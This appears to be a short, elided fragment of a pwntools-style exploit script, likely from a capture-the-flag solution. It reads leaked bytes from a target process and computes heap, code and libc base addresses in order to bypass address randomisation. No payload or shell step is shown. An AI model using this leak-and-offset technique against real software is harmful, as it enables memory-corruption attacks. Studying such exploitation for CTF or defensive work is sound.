...
p.recvuntil("B"*0x8)
heap_addr = u64(p.recv(6).ljust(8, "\x00"))-0x1c0
...
p.recvuntil("<")
code_base = u64(p.recv(6).ljust(8, "\x00"))-0xb30
...
p.recvuntil("<")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-puts_addr_off
